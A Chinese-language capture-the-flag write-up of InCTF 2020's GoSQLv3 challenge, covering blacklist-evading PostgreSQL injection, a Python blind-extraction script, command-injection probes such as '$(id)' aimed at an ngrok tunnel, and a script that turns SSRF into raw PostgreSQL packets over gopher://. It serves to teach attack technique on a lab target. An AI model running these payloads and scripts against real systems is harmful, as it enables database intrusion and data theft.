@@ -1,0 +1,531 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="724b0d08543dca6fd18c23fcf50744e5">长文慎读</h2>
+<p>在本文中，我将分享在<a href="https://twitter.com/teambi0s" target="_blank">teambi0s</a>'s <a href="https://ctftime.org/ctf/31" target="_blank">InCTF</a> 的GoSQLv3挑战中所面临的问题以及是如何解决的，我还将分享所有'无效'的技巧和测试，我认为这与实际的解决方案一样重要，因为它们可以在其他情况下起到作用。<br/>
+如果您认为有任何问题，请随时通过<a href="https://twitter.com/jorge_ctf" target="_blank">Twitter</a>或<a href="https://t.me/jorgectf" target="_blank">Telegram</a>与我联系。让我们开始吧！</p>
+<h2 data-content="1" id="af8023de4ff4ff8175c38240f58189b8">GoSQLv3</h2>
+<p>这项挑战基于PostgreSQL注入，该注入以（非常噩梦的）黑名单为条件，其后是SSRF，允许我们向数据库引擎发出Gopher请求。</p>
+<h2 data-content="1" id="c7f10727b3900094b890a64a2b300eb4">SQL注入</h2>
+<p>挑战代码：</p>
+<pre><code>&lt;?php
+include("./config.php");
+
+$db_connection = pg_connect($host. $dbname .$user. $pass);
+if (!$db_connection) {
+    die("Connection failed");
+}
+
+
+$name = $_GET['name'];
+$column = $_GET['column'];
+
+$blacklist  = "adm|min|\'|substr|mid|concat|chr|ord|ascii|left|right|for| |from|where|having|trim|pos|";
+$blacklist .= "insert|usern|ame|-|\/|go_to|or|and|#|\.|&gt;|&lt;|~|!|like|between|reg|rep|load|file|glob|cast|out|0b|\*|pg|con|%|to|";
+$blacklist .= "rev|0x|limit|decode|conv|hex|in|from|\^|union|select|sleep|if|coalesce|max|proc|exp|group|rand|floor";
+
+if (preg_match("/$blacklist/i", $name)){
+  die("Try Hard");
+}
+
+if (preg_match("/$blacklist/i", $column)){
+  die("Try Hard");
+}
+
+$query = "select " . $column . " from inctf2020 where username = " . $name ;
+
+$ret = pg_query($db_connection, $query);
+
+if($ret){
+while($row = pg_fetch_array($ret)){
+if($row['username']=="admin"){
+      header("Location:{$row['go_to']}");
+}
+  else{
+      echo "&lt;h4&gt;You are not admin " . "&lt;/h4&gt;";
+  }
+
+}
+}else{
+echo "&lt;h4&gt;Having a query problem" . "&lt;/h4&gt;&lt;br&gt;";
+}
+
+highlight_file(__FILE__);
+?&gt;</code></pre>
+<p>如代码所示，该PHP代码使用config.php来连接数据库，请求参数name和columns使用定义的$blacklist来过滤，最后执行查询，页面将跳转到下一页。<br/>
+让我们从查询的第一个变量column开始，为了更好的测试我将使用真实环境的PostgreSQL数据引擎，另外一个很好的选择是<a href="https://sqliteonline.com/" target="_blank">这里</a></p>
+<h2 data-content="1" id="f7db95c1cc34c5701761e511aa97b70e">column</h2>
+<p>据我所知，在PostgreSQL查询中有两种方式申明列名，第一种是使用大家公认的方法（列名没有被双引号包裹），而另一种是PostgresSQL独有的（列名被双引号包裹）<br/>
+没有双引号示例如下：</p>
+<pre><code>testdb=# SELECT testcolumn;
+ERROR:  column "testcolumn" does not exist</code></pre>
+<p>有双引号示例如下：</p>
+<pre><code>testdb=# SELECT "testcolumn";
+ERROR:  column "testcolumn" does not exist</code></pre>
+<p>以下细节是关键，因为我们将把列名定义为UTF-16编码。根据PostgreSQL的<a href="https://www.postgresql.org/docs/9.2/sql-syntax-lexical.html#SQL-SYNTAX-STRINGS-UESCAPE" target="_blank">官方文档</a>有如下语法（<a href="https://www.branah.com/unicode-converter" target="_blank">在线编码转换网站</a>）</p>
+<pre><code>test -&gt; \u0074\u0065\u0073\u0074 -&gt; U&amp;'\0074\0065\0073\0074'</code></pre>
+<p>运行结果如下：</p>
+<pre><code>testdb=# SELECT U&amp;'\0074\0065\0073\0074';
+ ?column?
+----------
+ test
+(1 row)`</code></pre>
+<p>因此，如果一切正常，为什么数据库返回一个字符串而不是列名？这就是为什么双引号这个“东西”是关键的原因。</p>
+<pre><code>testdb=# SELECT U&amp;\0074\0065\0073\0074;
+invalid command \0074
+
+testdb=# SELECT U&amp;'\0074\0065\0073\0074';
+ ?column?
+----------
+ test
+(1 row)
+
+testdb=# SELECT U&amp;"\0074\0065\0073\0074";
+ERROR:  column "test" does not exist</code></pre>
+<p>最好的总结就是：在SELECT语句后面，没有双引号包裹或者有被双引号包裹的字符串代表列名，而被单引号包裹的字符串总是代表字符串。<br/>
+有了上述信息，我们可以创建第一部分的查询语句：</p>
+<pre><code>testdb=# SELECT U&amp;"\0075\0073\0065\0072\006e\0061\006d\0065",U&amp;"\0067\006f\005f\0074\006f";
+ERROR:  column "username" does not exist</code></pre>
+<p>但这并没有多大用处，因为我们没有足够的信息来验证我们的payload会成功，因此让我们创建一个简单的表并包含那个列。</p>
+<pre><code>testdb=# CREATE TABLE inctf2020 (id int, username text, go_to text);
+CREATE TABLE</code></pre>
+<p>因为我们知道数据库中一个存在的值，最好也插入这个值</p>
+<pre><code>testdb=# INSERT INTO inctf2020 VALUES (1, 'admin', 'secret_place');
+INSERT 0 1
+
+testdb=# SELECT * FROM inctf2020;
+ id | username |    go_to
+----+----------+--------------
+  1 | admin    | secret_place
+(1 row)</code></pre>
+<p>现在我们继续测试payload</p>
+<pre><code>testdb=# SELECT U&amp;"\0075\0073\0065\0072\006e\0061\006d\0065",U&amp;"\0067\006f\005f\0074\006f" FROM inctf2020;
+ username |    go_to
+----------+--------------
+ admin    | secret_place
+(1 row)</code></pre>
+<p>成功了，我们成功的从指定的UTF-16编码的列名中查询到了所有的东西。<br/>
+不幸的是，由于这是我在参加AWAE之前研究的字符限制绕过技术之一，因此我很快就完成了注入的这一部分，因此这里没有多余的技巧/尝试。</p>
+<h2 data-content="1" id="9505c142f6ad13ccb4e8c9b9499b1065">name</h2>
+<p>因为在目标列名的查询中返回了'admin',因此这个阶段的目标是'写admin'， 看起来就像手写’admin'一样容易，但是恶魔般的黑名单又出现了。</p>
+<pre><code>$blacklist  = "adm|min|\'|...</code></pre>
+<p>这是在检查字符串是否包含' adm '，' min '和'。由于我们在这里没有太多选择，所以我通常参考<a href="https://www.postgresql.org/docs/9.1/functions-string.html" target="_blank">String函数文档</a>，并开始寻找可以帮助我们构建这样的字符串的方法。</p>
+<h2 data-content="1" id="c82ebe2b68f3fffbd83210f3c6ae7177">双$字符串</h2>
+<p>在寻找函数连接'admin'之前，我们需要找到一种方法不带单引号来声明字符串。应该很容易，不是吗？</p>
+<pre><code>testdb=# SELECT U&amp;"\0075\0073\0065\0072\006e\0061\006d\0065",U&amp;"\0067\006f\005f\0074\006f" FROM inctf2020 WHERE username = "admin";
+ERROR:  column "admin" does not exist
+
+testdb=# SELECT U&amp;"\0075\0073\0065\0072\006e\0061\006d\0065",U&amp;"\0067\006f\005f\0074\006f" FROM inctf2020 WHERE username = admin;
+ERROR:  column "admin" does not exist</code></pre>
+<p>正如我们之前所看到的，声明字符串的唯一方法是用单引号包围它们。那么我们该如何声明呢？显然，根据<a href="https://www.postgresql.org/docs/8.1/sql-syntax.html#4.1.2.2.%20Dollar-Quoted%20String%20Constants" target="_blank">Postgres文档</a>，可以使用双美元符号 ($)将字符串括起来.</p>
+<pre><code>testdb=# SELECT 'test';
+ ?column?
+----------
+ test
+(1 row)
+
+testdb=# SELECT $$test$$;
+ ?column?
+----------
+ test
+(1 row)</code></pre>
+<p>因此，我们现在准备找到一个函数来连接字符串' admin '。</p>
+<h2 data-content="1" id="56fa5da3dde45d1a9b069164f6611d67">LPAD功能</h2>
+<p>通过此功能，我们可以按字面意思“ 使用指定的字符来填充字符串至长度等于length。如果字符串已经长于length，那么它将被截断（在右侧）。”</p>
+<pre><code>testdb=# SELECT LPAD('world', 10, 'hello');
+    lpad
+------------
+ helloworld
+(1 row)</code></pre>
+<p>这就是我们连接“ admin ”的每个字符所需要的一切。（并不严格要求连接每个字符，但最好进行练习，以防我们再次需要它）</p>
+<p>这就是我们最终得到的：</p>
+<pre><code>testdb=# SELECT LPAD('n', 5, LPAD('i', 4, LPAD('m', 3, LPAD('d', 2, LPAD('a', 1, '')))));
+-------
+ admin
+(1 row)</code></pre>
+<p>好了！现在查询将返回我们想要的内容。</p>
+<h2 data-content="1" id="3586304032cb3be494a586760462de01">'||' 字符连接</h2>
+<p>但是，在Postgres中是否没有另一种（更容易的）串联字符串的方法？是的（戳<a href="https://stackoverflow.com/questions/35797709/why-is-used-as-string-concatenation-in-postgresql-redshift" target="_blank">这里</a>）。但是，我们将再次使用之前的一种技术。</p>
+<pre><code>$ python3 -c 'print("||".join("$$"+i+"$$" for i in "admin"))'
+
+$$a$$||$$d$$||$$m$$||$$i$$||$$n$$
+testdb=# SELECT $$a$$||$$d$$||$$m$$||$$i$$||$$n$$;
+ ?column?
+----------
+ admin
+(1 row)</code></pre>
+<h2 data-content="1" id="0877bff4723b0acd5d87be429e384db9">获取secret的位置</h2>
+<p>让我们提交查询以获取下一个阶段的URL。</p>
+<pre><code>$ curl -I 'http://MIRROR/?column=U&amp;"\0075\0073\0065\0072\006e\0061\006d\0065",U&amp;"\0067\006f\005f\0074\006f"&amp;name=$$a$$||$$d$$||$$m$$||$$i$$||$$n$$'
+
+HTTP/1.1 200 OK
+Date: Sun, 02 Aug 2020 18:11:43 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Content-Type: text/html; charset=UTF-8</code></pre>
+<p>嗯，看来我们缺少了某些东西……或者实际上没有。后端采用了两个以上的$_GET参数，因为＆符号没有经过URL编码，将代表新的GET参数，对&amp;进行URL编码如下。<br/>
+&amp; -&gt; (URL 编码) -&gt; %26</p>
+<pre><code>$ curl -I 'http://MIRROR/?column=U%26"\0075\0073\0065\0072\006e\0061\006d\0065",U%26"\0067\006f\005f\0074\006f"&amp;name=$$a$$||$$d$$||$$m$$||$$i$$||$$n$$'
+
+HTTP/1.1 302 Found
+Date: Sun, 02 Aug 2020 18:14:03 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Location: ./feel_the_gosql_series.php
+Content-Type: text/html; charset=UTF-8</code></pre>
+<p>好了！我们要跟随的连链接是feel_the_gosql_series.php。</p>
+<h2 data-content="1" id="97ea592ecc464301ed7363c0859f2e13">SSRF 方法</h2>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200812114325-fa031a4a-dc4d-1.png"/></p>
+<p>我们面对着一个输入框，其内容将用cURL执行。在枚举输入允许的协议之前，让我们看看是否可以注入什么东西。</p>
+<h2 data-content="1" id="689a7253132eac1d8114424d872f03ed">代码注入（失败）</h2>
+<p>如果后端未使用<a href="https://www.php.net/manual/en/function.escapeshellarg.php" target="_blank">escapeshellarg()</a>函数，则可以通过转义提供的引号或仅执行来注入代码$(command here)。为了正确地测试它，需要一个公共且可访问的IP地址，但是，有一个名为<a href="https://ngrok.com/" target="_blank">ngrok</a>的工具，它允许我们将localhost开放到由它们分配的域名下。有一个关于它是如何工作的更详细的文章在<a href="https://0xdf.gitlab.io/2020/05/12/ngrok-ftw.html" target="_blank">这里</a>。</p>
+<p>我们可以尝试类似的方法：</p>
+<pre><code>NGROK-TUNNEL/$(id)
+NGROK-TUNNEL/'$(id)
+NGROK-TUNNEL/"$(id)
+NGROK-TUNNEL/"'$(id)</code></pre>
+<p>但是并不会起作用，因为它实际上是在使用刚才提到的<a href="http://micmap.org/php-by-example/en/function/escapeshellarg" target="_blank">函数</a></p>
+<h2 data-content="1" id="b87edf5034a5bf722f860097b8f668cc">枚举可用的协议</h2>
+<p>根据<a href="https://www.mit.edu/afs.new/sipb/user/ssen/src/curl-7.11.1/docs/curl.html" target="_blank">curl的手册页</a>，其支持的协议为HTTP, HTTPS, FTP, FTPS, GOPHER, DICT, TELNET, LDAP or FILE，因此让我们看看其中实际上允许哪些协议。</p>
+<h3 data-content="1" id="a121fe144fa89674fd05875e77423b89">寻找一种布尔方式来枚举它们</h3>
+<p>为了正确地找出其中哪些是允许的，仅通过发送file://，就会出现一条不同的消息（Can't you solve, without using it!!!），因此现在我们可以测试该词典了。（时间不长，因此手动也可以）</p>
+<pre><code>protos="http https ftp ftps gopher dict telnet ldap file"; for proto in $protos; do echo $proto; curl 'http://MIRROR/feel_the_gosql_series.php' -d "url=$proto://"; echo;done</code></pre>
+<p>不会引发任何错误的协议是HTTP（S），GOPHER和TELNET。如果这是使用的是eval或是类似的方法处理查询的响应时，则可以使用除Gopher之外的任何方式注入PHP代码，但是我们唯一能做的就是客户端注入（HTML / JS），这没什么价值。</p>
+<h3 data-content="1" id="97d8505d0e83c8f78b6dd8c8dc64031d">验证Gopher能否使用（并且数据库是否使用的常规端口）</h3>
+<p>要在客户端验证gopher是否有效，就像查询是否挂起一样简单。</p>
+<p>本地验证：</p>
+<p>（hung状态-&gt;waiting for more packets）</p>
+<pre><code>A&gt; nc -lnvp 99
+listening on [any] 99 ...
+
+B&gt; curl gopher://127.0.0.1:99
+
+A&gt; connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42446
+# (waiting for more packets)</code></pre>
+<p>（非hung状态-&gt;连接被拒绝，也就是未打开端口）</p>
+<pre><code>$ curl gopher://127.0.0.1:81
+curl: (7) Failed to connect to 127.0.0.1 port 81: Connection refused</code></pre>
+<p>在挑战中，端口5432（PostgreSQL）是hung状态。</p>
+<p><strong>关于什么是('gopher://')?</strong></p>
+<p>简而言之，gopher它能够按照特定语法发送以URL硬编码的TCP数据包。这使我们可以与后端运行的任何服务进行通信，例如我们刚刚用于获取securl URL的Postgres数据库。（<a href="https://hackerone.com/reports/115748" target="_blank">更多 信息</a>）</p>
+<p>关于过去的GoSQLvX挑战，我们现在应该通过此协议向数据库发出请求。有一个已经创建的名为<a href="https://github.com/tarunkant/Gopherus" target="_blank">Gopherus</a>的工具，它的创建者也是这个挑战，它的模块之一是为PostgreSQL制作的。但是，在挑战之时，他尚未提交更新，因此我们需要自己写“插件”！</p>
+<h3 data-content="1" id="3a4d8d2c424c813c60bab81b9291cbee">PostgreSQL Gopher漏洞利用…但还不是时候</h3>
+<p>要使查询成功，用户名和数据库名必须知道！</p>
+<h2 data-content="1" id="09f28fd7877581ae20c61d4b957ad557">返回SQL注入</h2>
+<p>请记住，我们使用此查询来获取secret的链接。</p>
+<pre><code>http://MIRROR/?column=U%26"\0075\0073\0065\0072\006e\0061\006d\0065",U%26"\0067\006f\005f\0074\006f"&amp;name=$$a$$||$$d$$||$$m$$||$$i$$||$$n$$</code></pre>
+<p>接下来，我将使用实际查询作为参考，以便我们更好地理解它。</p>
+<pre><code>SELECT U&amp;"\0075\0073\0065\0072\006e\0061\006d\0065",U&amp;"\0067\006f\005f\0074\006f" FROM inctf2020 WHERE name = $$a$$||$$d$$||$$m$$||$$i$$||$$n$$</code></pre>
+<p>我们如何检索用户名和数据库名称？首先，让我们看看如何以常规的方式获取它们。（我经常参考的<a href="https://wiki.devploit.dev/web/attacks/sqli/postgresql/queries_cheatsheet" target="_blank">备忘单</a>）</p>
+<ul>
+<li>用户检索</li>
+</ul>
+<pre><code>testdb=# SELECT USER;
+   user
+----------
+ postgres
+(1 row)</code></pre>
+<ul>
+<li>数据库名称检索</li>
+</ul>
+<pre><code>testdb=# SELECT current_database();
+ current_database
+------------------
+ testdb
+(1 row)</code></pre>
+<h2 data-content="1" id="e5e5ac9de85bd99c592d7711ab03c295">布尔数据检索</h2>
+<p>实际上，我们要获取用户名和数据库名，必须找到一种方法同我们提供的字符串进行比较，然后知道该比较的结果是TRUE还是FALSE。</p>
+<p>为了完成上述需求，我们将用'a'来填充'admin' 字符串N次，N是比较结果的长度。（当比较结果为FALSE时结果为'admin'，当比较结果为TRUE时结果为'admi')</p>
+<ul>
+<li>使用LPAD（没错，又是它，但是现在的目标是减少传递的字符串）</li>
+</ul>
+<pre><code>testdb=# SELECT LPAD('123456', 3, '');
+ lpad
+------
+ 123
+(1 row)</code></pre>
+<ul>
+<li>VARCHAR（X）强制转换</li>
+</ul>
+<pre><code>testdb=# SELECT '123456'::VARCHAR(3);
+ varchar
+---------
+ 123
+(1 row)</code></pre>
+<p>在撰写本文时，我想到这样做也可以完成我们想要的工作。</p>
+<pre><code>testdb=# SELECT ($$a$$||$$d$$||$$m$$||$$i$$||$$n$$)::VARCHAR(3);
+ varchar
+---------
+ adm
+(1 row)</code></pre>
+<ul>
+<li>布尔词简化</li>
+</ul>
+<p>由于'admin'和false是的一样的长度，使用LPAD 'admin' N次''。N是FALSE的长度,'admin'不会被改变。但是，如果比较结果为TRUE，就会变成'admi'，因为TRUE的长度是4。</p>
+<pre><code>testdb=# SELECT LENGTH((1=2)::TEXT);
+ length
+--------
+      5
+(1 row)
+
+testdb=# SELECT LENGTH((1=1)::TEXT);
+ length
+--------
+      4
+(1 row)</code></pre>
+<pre><code>testdb=# SELECT LPAD('admin' ,LENGTH((1=1)::TEXT), '');
+ lpad
+------
+ admi
+(1 row)
+
+testdb=# SELECT LPAD('admin' ,LENGTH((1=2)::TEXT), '');
+ lpad
+-------
+ admin
+(1 row)</code></pre>
+<ul>
+<li>基于变量简化的布尔词简化</li>
+</ul>
+<p>以前的比较也可以用于数据库变量。</p>
+<pre><code>testdb=# SELECT LPAD('admin' ,LENGTH((USER='randomuser')::TEXT), '');
+ lpad
+-------
+ admin
+(1 row)
+
+testdb=# SELECT LPAD('admin' ,LENGTH((USER='postgres')::TEXT), '');
+ lpad
+------
+ admi
+(1 row)</code></pre>
+<p>但是，暴力破解可能要花费我们几年的时间，而CTF持续2天！因此，让我们看看是否可以找到类似与普通<strong>LIKE '{char}%'</strong>技术的方法。</p>
+<pre><code>testdb=# SELECT LPAD('admin' ,LENGTH((USER::VARCHAR(1)='a')::TEXT), '');
+ lpad
+-------
+ admin
+(1 row)
+
+testdb=# SELECT LPAD('admin' ,LENGTH((USER::VARCHAR(1)='p')::TEXT), '');
+ lpad
+------
+ admi
+(1 row)</code></pre>
+<ul>
+<li>最终“name”的payload</li>
+</ul>
+<pre><code>'lpad($$a$$||$$d$$||$$m$$||$$i$$||$$n$$,LENGTH((%s::VARCHAR(%s)=%s)::TEXT),$$a$$)' % (parameter_to_exfiltrate, offset, extracted_data+current_char)</code></pre>
+<p>注意最后一个$$a$$。禁止使用单引号，尽管$$$$应该没问题，但我更喜欢留下一个随机字母以确保我不会弄乱查询。<br/>
+例：</p>
+<pre><code>'lpad($$a$$||$$d$$||$$m$$||$$i$$||$$n$$,LENGTH((USER::VARCHAR(5)=ABCDE)::TEXT),$$a$$)'</code></pre>
+<p>这次，如果USER值的前5个字符为ABCDE，则为(USER::VARCHAR(5)=ABCDE)TRUE，LENGTH((USER::VARCHAR(5)=ABCDE)::TEXT)为4，lpad($$a$$||$$d$$||$$m$$||$$i$$||$$n$$,LENGTH((USER::VARCHAR(5)=ABCDE)::TEXT),$$a$$)并返回'admi'。</p>
+<h2 data-content="1" id="05b08290e41b10a09da838e10f33125e">问题</h2>
+<p>该查询非常有趣，可以帮助我们检索变量/返回函数值，但是如果值包含禁止的字符怎么办？在这种情况下，此查询无用。</p>
+<ul>
+<li>避免多个字符限制</li>
+</ul>
+<p>多亏了“ ||” 字符级联，我们可以绕过所有长度大于1的黑名单字段。</p>
+<p>存在USER test和存在'st' 被黑名单，下面的语句将起作用。</p>
+<pre><code>$ python3 -c 'print("||".join("$$"+i+"$$" for i in "test"))'
+
+$$t$$||$$e$$||$$s$$||$$t$$</code></pre>
+<pre><code>testdb=# SELECT LPAD('admin' ,LENGTH((USER::VARCHAR(4)=$$t$$||$$e$$||$$s$$||$$t$$)::TEXT), $$$$);
+ lpad
+------
+ admi
+(1 row)</code></pre>
+<p>但是，如果被禁止的字符为'e'，我们将无能为力，因为它总是必须存在。</p>
+<h2 data-content="1" id="640d2390f277dad096ae42ccb8e9e394">注入变化</h2>
+<p>经过大量的努力我更乐于接受另一个“更轻松”的挑战（嗯，也许我不想那么麻烦），我想到了split_part函数。它几乎与python的split函数相同，允许你设置“想要”分割的部分。</p>
+<h3 data-content="1" id="946316784c3cc0dca9dc1d609aab2974">它是做什么用的</h3>
+<pre><code>testdb=# SELECT split_part('12345', '3', 1);
+ split_part
+------------
+ 12
+(1 row)</code></pre>
+<h3 data-content="1" id="7aff404c5fc7e26e765a306d7376339d">（一种）使用场景</h3>
+<pre><code>testdb=# SELECT split_part(USER, 'p', 2);
+ split_part
+------------
+ ostgres
+(1 row)
+
+testdb=# SELECT split_part(USER, USER::VARCHAR(1), 2);
+ split_part
+------------
+ ostgres
+(1 row)
+
+testdb=# SELECT split_part(USER, USER::VARCHAR(1), 2)::VARCHAR(1);
+ split_part
+------------
+ o
+(1 row)</code></pre>
+<p>这样，变量可被一个字符一个字符的提取出来（第一个字符除外）。</p>
+<h2 data-content="1" id="3935979115ff69fb6d38d9b11d8b546d">资料检索</h2>
+<p>由于我一直热衷于在遇到的挑战中实现一切自动化，因此我最终使用了以下脚本：</p>
+<pre><code># -*- coding: utf-8 -*-
+
+import requests
+from string import ascii_letters, digits
+import base64
+
+url = "http://MIRROR"
+#to_exfil = "USER"
+#to_exfil = "version()"
+to_exfil = "current_database()"
+
+extracted = ""
+offset = 1
+
+while True:
+
+    for char in ascii_letters + digits + "@{}()\"=[]:;+":
+
+        params = {
+            'column': r'U&amp;"\0075\0073\0065\0072\006e\0061\006d\0065",U&amp;"\0067\006f\005f\0074\006f"',
+            'name': 'lpad($$a$$||$$d$$||$$m$$||$$i$$||$$n$$,LENGTH((split_part(%s,%s::VARCHAR(%s),2)::VARCHAR(1)=$$%s$$)::TEXT),$$a$$)' % (to_exfil, to_exfil, offset, char)
+        }
+
+        req = requests.get(url, params=params, allow_redirects=False)
+        #print(params)
+        #print(req.headers, extracted)
+
+        if not 'Location' in req.headers:
+
+            if req.text == "Try Hard":
+                continue
+            else:
+                extracted += char
+                offset += 1
+            print(extracted)
+            break
+
+        else:
+            if extracted[-5::] == '?'*5:
+                print(f"EXTRACTED {to_exfil}: {extracted[:-5]}")
+                break
+            extracted += "?"
+            offset += 1
+
+# USER = oneysingh (honeysingh)
+# version() = (P)ostgreSQL?9?5?21?on?x86?64?pc?linux?gnu??compiled?by?gcc?(Ubuntu?5?4?0?6ubuntu1?16?04?12)?5?4?0?20160609??64?bit
+# current_database() = osqlv3 (gosqlv3)</code></pre>
+<p>为什么使用"?"，因为我需要完整的version()。</p>
+<h2 data-content="1" id="6ec1bdd2a38b3ef1919d3a681262b6cf">回到SSRF</h2>
+<p>现在我们知道了用户名和数据库，就可以构建环境了。为了不将gopher数据包弄得太乱，我最终创建了相同的用户和数据库（我对数据包的结构，语法也不太感兴趣……我将其作为长久的主题）。</p>
+<p>通过发送此命令，我们将生成所需的流量以进行查询，而我们只需要更改命令（及其长度）即可。</p>
+<pre><code>psql -h 127.0.0.1 -U honeysingh -d "dbname=gosqlv3 sslmode=disable" -c "SELECT 1;"</code></pre>
+<p>注意sslmode=disable标志，不要通过TLS发送数据包。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20200812114359-0eab8928-dc4e-1.png"/></p>
+<p>这是我们必须在脚本中使用的Startup message（aka auth）,将其复制为Hex放到我们的脚本里。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20200812114429-2021053e-dc4e-1.png"/></p>
+<p>简单的query也需要上述操作，但其长度是查询的关键<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20200812114454-2f02b9da-dc4e-1.png"/></p>
+<p>最后Termination也同样需要</p>
+<h2 data-content="1" id="2930912d3c32b7e45dbf3d5600e59114">一起来完成</h2>
+<pre><code>import binascii
+import requests
+
+def encode(s):
+    a = [s[i:i + 2] for i in range(0, len(s), 2)]
+    return "gopher://127.0.0.1:5432/_%" + "%".join(a)
+
+url = "http://MIRROR/feel_the_gosql_series.php"
+
+while True:
+    query = input("SQL&gt; ") # MÁX 122 CHARS
+
+    if len(query) &gt; 122:
+        print("Máx 122 chars")
+        continue
+
+    query_hex = binascii.hexlify(query.encode()).decode()
+    query_hex_packet = query_hex + "00"
+    query_len = len(query) + 5
+    query_len_packet = binascii.hexlify(chr(query_len).encode()).decode()
+
+    # Startup
+    test = "00000055000300007573657200686f6e657973696e676800646174616261736500676f73716c7633006170706c69636174696f6e5f6e616d65007073716c00636c69656e745f656e636f64696e6700555446380000"
+    # Query
+    test += f"51000000{query_len_packet}{query_hex_packet}"
+    # Termination
+    test += "5800000004"
+
+    to_send = encode(test)
+
+    req = requests.post(url, data={'url': to_send})
+    print(req.text)</code></pre>
+<ul>
+<li>编码函数取自Gopherus的MySQL漏洞利用，并且每个两个十六进制字符都用％包围。</li>
+<li>query_len是查询的实际长度+ 5，数据包值必须是query_len的十六进制值。</li>
+<li>122个字符的限制与query_len急剧变化有关。</li>
+</ul>
+<h2 data-content="1" id="2c07d9b4c8f3916b482530792a51a5a4">通过非常规方法找到flag</h2>
+<p>通过列出权限列表，我发现了一个我能使用的已经存在的表名cmd_exe。</p>
+<pre><code>SQL&gt; SELECT grantee,table_catalog,table_schema,table_name,privilege_type FROM information_schema.role_table_grants                                                        
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;SomeTimes hard chall is good&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h2&gt;Welcome Back!!! admin !!!&lt;/h2&gt;
+&lt;h3&gt;You have one functionality that you can cURL&lt;/h3&gt;
+&lt;form method=POST&gt;
+put url : &lt;input type="text" name="url"&gt;
+&lt;button type="submit"&gt;GO&lt;/button&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+
+S→application_namepsqlS↓client_encodingUTF8S↨DateStyleISO, MDYS↓integer_datetimesonSntervalStylepostgresS§is_superuseroffS↓server_encodingUTF8S→server_version9.5.21S%session_authorizationhoneysinghS#standard_conforming_stringsonS§TimeZoneEtc/UTCK♀♠=‼f�)Z♣IT�♣grantee/�☻♦‼������table_catalog/�♥♦‼������table_schema/�♦♦‼������table_name/�♣♦‼������privilege_type/�♠♦‼������D&lt;♣
+honeysinghgosqlv3♠public♣eeeee♠INSERTD&lt;♣
+honeysinghgosqlv3♠public♣eeeee♠SELECTD&lt;♣
+honeysinghgosqlv3♠public♣eeeee♠UPDATED&lt;♣
+honeysinghgosqlv3♠public♣eeeee♠DELETED&gt;♣
+honeysinghgosqlv3♠public♣eeeeTRUNCATED@♣
+honeysinghgosqlv3♠public♣eeeee
+REFERENCESD=♣
+honeysinghgosqlv3♠public♣eeeeeTRIGGERD?♣
+honeysinghgosqlv3♠publifooooooo♠INSERTD?♣
+honeysinghgosqlv3♠publifooooooo♠SELECTD?♣
+honeysinghgosqlv3♠publifooooooo♠UPDATED?♣
+honeysinghgosqlv3♠publifooooooo♠DELETEDA♣
+honeysinghgosqlv3♠publifooooooTRUNCATEDC♣
+honeysinghgosqlv3♠publifooooooo
+REFERENCESD@♣
+honeysinghgosqlv3♠publifoooooooTRIGGERD&lt;♣
+honeysinghgosqlv3♠public♣ddddd♠INSERTD&lt;♣
+honeysinghgosqlv3♠public♣ddddd♠SELECTD&lt;♣
+honeysinghgosqlv3♠public♣ddddd♠UPDATED&lt;♣
+honeysinghgosqlv3♠public♣ddddd♠DELETED&gt;♣
+honeysinghgosqlv3♠public♣ddddTRUNCATED@♣
+honeysinghgosqlv3♠public♣ddddd
+REFERENCESD=♣
+honeysinghgosqlv3♠public♣dddddTRIGGERD:♣♣inctfgosqlv3♠publicmd_exec♠INSERTD:♣♣inctfgosqlv3♠publicmd_exec♠SELECTD:♣♣inctfgosqlv3♠publicmd_exec♠UPDATED:♣♣inctfgosqlv3♠publicmd_exec♠DELETED&lt;♣♣inctfgosqlv3♠publicmd_exeTRUNCATED&gt;♣♣inctfgosqlv3♠publicmd_exec
+REFERENCESD;♣♣inctfgosqlv3♠publicmd_execTRIGGERD@♣
+honeysinghgosqlv3♠public        inctf2020♠SELECTC♫SELECT 29Z♣I</code></pre>
+<p>查询它将获取flag</p>
+<pre><code>L&gt; SELECT * FROM cmd_exec
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;SomeTimes hard chall is good&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h2&gt;Welcome Back!!! admin !!!&lt;/h2&gt;
+&lt;h3&gt;You have one functionality that you can cURL&lt;/h3&gt;   
+&lt;form method=POST&gt;
+put url : &lt;input type="text" name="url"&gt;
+&lt;button type="submit"&gt;GO&lt;/button&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+
+S→application_namepsqlS↓client_encodingUTF8S↨DateStyleISO, MDYS↓integer_datetimesonSntervalStylepostgresS§is_superuseroffS↓server_encodingUTF8S→server_version9.5.21S%session_authorizationhoneysinghS#standard_conforming_stringsonS§TimeZoneEtc/UTCK♀      [qi�↕Z♣IT#☺cmd_output☺�♥☺↓������DM☺CFLAG: inctf{Life_Without_Gopherus_not_having_postgreSQL_exploit_:(}D
+SELECT 2Z♣I</code></pre>
+<p>显然，这不是预期获取flag的方法。因为SpyD3r在他的官方的<a href="https://spyclub.tech/2020/08/02/inctf2020-gosqlv3-challenge-writeup/" target="_blank">writeup</a>中写到："The GoSQLv3 challenge got 8 solves but I would say the only one full solve that was RCE by the EpicLeetTeam(Congratulations for the first blood) but mistakenly the team has saved the flag on one of the table and most of the team just read the flag from that table."</p>
+<p>但是，我觉得实际上是这样，因为用户不是超级管理员，也无法从程序或文件复制或Copy to。</p>
+<p>但是，SpyD3r分享了如何从具有特权的表中获取特权，如何上载库并以系统用户身份执行命令。但是，因为表名是cmd_exec（这就是每个PostgreSQL速查表中显示的名称），也许使用该set role技巧就足以从程序中<a href="https://www.postgresql.org/docs/9.5/sql-copy.html" target="_blank">复制</a>并读取flag。</p>
